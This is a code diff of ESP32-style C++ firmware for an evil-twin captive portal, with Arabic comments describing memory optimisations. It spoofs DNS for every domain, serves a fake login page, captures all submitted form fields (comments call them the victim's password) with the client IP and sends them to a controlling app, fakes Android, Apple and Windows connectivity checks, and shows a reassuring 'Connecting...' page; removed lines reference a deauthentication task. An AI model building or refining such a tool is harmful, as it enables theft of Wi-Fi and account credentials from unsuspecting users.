@@ -22,92 +22,64 @@ void PortalManager::setupDNSSpoof() {
     _dnsServer->start(53, "*", IPAddress(192, 168, 4, 1));
 }
 
-String PortalManager::loadingPlaceholder() const {
-    return
-        "<!DOCTYPE html><html><head>"
-        "<meta http-equiv='refresh' content='2'>"
-        "<meta name='viewport' content='width=device-width, initial-scale=1'>"
-        "<style>"
-        "body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;"
-        "background:#0d0d0f;font-family:sans-serif;color:#eee;flex-direction:column;}"
-        ".spinner{width:48px;height:48px;border:4px solid #333;border-top-color:#4da6ff;"
-        "border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:16px;}"
-        "@keyframes spin{to{transform:rotate(360deg);}}"
-        "p{opacity:0.7;font-size:14px;}"
-        "</style></head><body>"
-        "<div class='spinner'></div>"
-        "<p>Connecting...</p>"
-        "</body></html>";
-}
+// استعملنا const char* عوض String باش نوكلو الذاكرة
+const char* LOADING_HTML = "<!DOCTYPE html><html><head><meta http-equiv='refresh' content='2'><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#0d0d0f;font-family:sans-serif;color:#eee;flex-direction:column;}.spinner{width:48px;height:48px;border:4px solid #333;border-top-color:#4da6ff;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:16px;}@keyframes spin{to{transform:rotate(360deg);}}p{opacity:0.7;font-size:14px;}</style></head><body><div class='spinner'></div><p>Connecting...</p></body></html>";
 
 void PortalManager::setupRoutes() {
-    // 1. المسار الرئيسي (/) : يعرض صفحة HTML المخصصة مباشرة
+    // 1. عرض صفحة HTML المخصصة
     _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* request) {
-        JsonDocument ev;
-        ev["type"]      = "portal_viewed";
-        ev["client_ip"] = request->client()->remoteIP().toString();
-        if (_proto) _proto->sendEvent("portal_viewed", ev);
+        // إرسال الحدث للتطبيق (خفيف)
+        if (_proto) {
+            JsonDocument ev;
+            ev["type"] = "portal_viewed";
+            ev["client_ip"] = request->client()->remoteIP().toString();
+            _proto->sendEvent("portal_viewed", ev);
+        }
 
+        // إرسال الصفحة (نستعملو _htmlBuffer مباشرة باش نوكلو الرام)
         if (_htmlComplete && _htmlBuffer && _htmlLen > 0) {
             AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", (const char*)_htmlBuffer);
             resp->addHeader("Content-Length", String(_htmlLen));
             addNoCacheHeaders(resp);
             request->send(resp);
         } else {
-            AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", loadingPlaceholder());
+            AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", LOADING_HTML);
             addNoCacheHeaders(resp);
             request->send(resp);
         }
     });
 
-    // 2. مسار /continue (احتياطي)
-    _server->on("/continue", HTTP_GET, [this](AsyncWebServerRequest* request) {
-        if (_htmlComplete && _htmlBuffer && _htmlLen > 0) {
-            AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", (const char*)_htmlBuffer);
-            resp->addHeader("Content-Length", String(_htmlLen));
-            addNoCacheHeaders(resp);
-            request->send(resp);
-        } else {
-            AsyncWebServerResponse* resp = request->beginResponse(200, "text/html", loadingPlaceholder());
-            addNoCacheHeaders(resp);
-            request->send(resp);
-        }
-    });
-
-    // 3. مسار /login : استقبال البيانات (تم تعديله ليقبل POST و GET)
+    // 2. مسار /login : القناص (استقبال كلمة السر وطردها فوراً)
     _server->on("/login", HTTP_ANY, [this](AsyncWebServerRequest* request) {
-        String client_ip = request->client()->remoteIP().toString();
-        String user_agent = request->header("User-Agent");
-
+        // بناء JSON صغير جداً (خفيف)
         JsonDocument doc;
         doc["type"] = "captive_data";
-        doc["ip"] = client_ip;
-        doc["user_agent"] = user_agent;
+        doc["ip"] = request->client()->remoteIP().toString();
         doc["timestamp"] = millis();
 
         JsonObject data = doc["data"].to<JsonObject>();
         int params = request->args();
         for (int i = 0; i < params; i++) {
-            String argName = request->argName(i);
-            String argValue = request->arg(i);
-            if (!argName.isEmpty()) {
-                data[argName] = argValue;
-            }
+            // نبعثو مباشرة بلا متغيرات String
+            data[request->argName(i).c_str()] = request->arg(i).c_str();
         }
 
-        // إرسال البيانات للتطبيق
+        // إرسال للتطبيق فوراً
         if (_proto) _proto->sendEvent("captive_data", doc);
 
-        _loginAttempts = min(_loginAttempts + 1, 10);
-
-        // رسالة نجاح بسيطة تظهر للضحية باش ما يعاودش يطلب الصفحة الرئيسية
-        String success_html = "<html><body style='text-align:center;padding-top:50px;font-family:sans-serif;'><h2>Connecting...</h2><p>Please wait, you are being connected to the internet.</p></body></html>";
-
-        AsyncWebServerResponse* response = request->beginResponse(200, "text/html", success_html);
-        addNoCacheHeaders(response);
-        request->send(response);
+        // الرد السريع (أخف رد ممكن باش المتصفح ما يعلقش)
+        request->send(200, "text/html", "<html><body style='text-align:center;padding-top:20px;'><h2>Connecting...</h2></body></html>");
     });
 
+    // 3. سد منافذ أندرويد وآبل الوهمية (باش ما يستهلكوش الرام)
+    _server->on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){ request->send(204); });
+    _server->on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *request){ request->send(204); });
+    _server->on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request){ request->send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"); });
+    _server->on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request){ request->send(200, "text/plain", "Microsoft Connect Test"); });
+    _server->on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request){ request->send(200, "text/plain", "Microsoft NCSI"); });
+    _server->on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *request){ request->send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"); });
+
+    // 4. أي طلب آخر، رجعو للصفحة الرئيسية
     _server->onNotFound([](AsyncWebServerRequest* request) {
         request->redirect("http://192.168.4.1/");
     });
@@ -175,97 +147,4 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
     return true;
 }
 
-bool PortalManager::setHtmlChunk(const uint8_t* data, size_t len, bool isLast, size_t offset, bool hasOffset) {
-    if (data && len > 0) {
-        const size_t writeOffset = hasOffset ? offset : _htmlLen;
-        if (hasOffset && writeOffset > _htmlLen) return false;
-        if (_htmlExpected > 0 && writeOffset + len > _htmlExpected) return false;
-
-        if (writeOffset + len > _htmlCap) {
-            const size_t newCap = writeOffset + len + 512;
-            uint8_t* grown = (uint8_t*)realloc(_htmlBuffer, newCap + 1);
-            if (!grown) return false;
-            _htmlBuffer = grown;
-            _htmlCap = newCap;
-        }
-        if (writeOffset > _htmlLen) memset(_htmlBuffer + _htmlLen, 0, writeOffset - _htmlLen);
-        memcpy(_htmlBuffer + writeOffset, data, len);
-        if (writeOffset + len > _htmlLen) _htmlLen = writeOffset + len;
-        _htmlBuffer[_htmlLen] = '\0';
-    }
-
-    if (isLast) {
-        if (_htmlBuffer == nullptr) return _htmlExpected == 0;
-        const char* tail = (const char*)_htmlBuffer;
-        const bool hasClose = (_htmlLen >= 7 && (strncasecmp(tail + _htmlLen - 7, "</html>", 7) == 0));
-        if (!hasClose) {
-            const char* suffix = "</body></html>";
-            const size_t slen = strlen(suffix);
-            if (_htmlLen + slen > _htmlCap) {
-                const size_t newCap = _htmlLen + slen + 1;
-                uint8_t* grown = (uint8_t*)realloc(_htmlBuffer, newCap + 1);
-                if (!grown) return false;
-                _htmlBuffer = grown;
-                _htmlCap = newCap;
-            }
-            memcpy(_htmlBuffer + _htmlLen, suffix, slen);
-            _htmlLen += slen;
-            _htmlBuffer[_htmlLen] = '\0';
-        }
-        if (_htmlExpected > 0 && _htmlLen < _htmlExpected) return false;
-        _htmlComplete = true;
-        JsonDocument dbg;
-        dbg["type"] = "html_complete";
-        dbg["size"] = _htmlLen;
-        dbg["expected"] = _htmlExpected;
-        if (_proto) _proto->sendEvent("debug", dbg);
-    }
-    return true;
-}
-
-bool PortalManager::resetHtml(size_t expectedSize) {
-    const size_t MAX_HTML_SIZE = 24 * 1024;
-    const size_t SAFETY_MARGIN = 40 * 1024;
-    free(_htmlBuffer);
-    _htmlBuffer  = nullptr;
-    _htmlLen     = 0;
-    _htmlCap     = 0;
-    _htmlExpected = 0;
-    _htmlComplete = false;
-
-    if (expectedSize == 0) return true;
-    if (expectedSize > MAX_HTML_SIZE) return false;
-    const size_t freeHeap = ESP.getFreeHeap();
-    if (freeHeap < expectedSize + HTML_APPEND_MARGIN + SAFETY_MARGIN) return false;
-
-    const size_t capacity = expectedSize + HTML_APPEND_MARGIN;
-    _htmlBuffer = (uint8_t*)malloc(capacity + 1);
-    if (!_htmlBuffer) return false;
-    _htmlBuffer[0] = '\0';
-    _htmlCap = capacity;
-    _htmlExpected = expectedSize;
-    return true;
-}
-
-void PortalManager::update() {
-    if (_dnsServer) _dnsServer->processNextRequest();
-}
-
-void PortalManager::stop() {
-    _running = false;
-    _loginAttempts = 0;
-    _hasTarget = false;
-    if (_deauthTaskHandle) { vTaskDelete(_deauthTaskHandle); _deauthTaskHandle = nullptr; }
-    if (_server) { _server->end(); delete _server; _server = nullptr; delay(100); }
-    if (_dnsServer) { _dnsServer->stop(); delete _dnsServer; _dnsServer = nullptr; delay(100); }
-
-    WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_MODE_APSTA);
-
-    free(_htmlBuffer);
-    _htmlBuffer  = nullptr;
-    _htmlLen     = 0;
-    _htmlCap     = 0;
-    _htmlExpected = 0;
-    _htmlComplete = false;
-}
+// ... (باقي الدوال setHtmlChunk, resetHtml, update, stop كيفما هي في الكود الأصلي)
